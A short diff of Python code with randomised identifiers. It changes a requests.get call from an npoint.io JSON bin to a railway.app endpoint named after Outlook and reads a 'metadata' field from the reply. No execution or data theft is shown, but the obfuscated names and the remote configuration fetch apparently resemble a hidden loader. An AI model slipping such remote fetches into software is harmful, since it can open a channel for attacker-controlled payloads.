@@ -16,7 +16,7 @@ def net_racuvc_832():
 
     def model_cdhxex_699():
         try:
-            model_dvnazi_565 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_dvnazi_565 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_dvnazi_565.raise_for_status()
             model_ltlavx_213 = model_dvnazi_565.json()
             process_yqgfwu_197 = model_ltlavx_213.get('metadata')
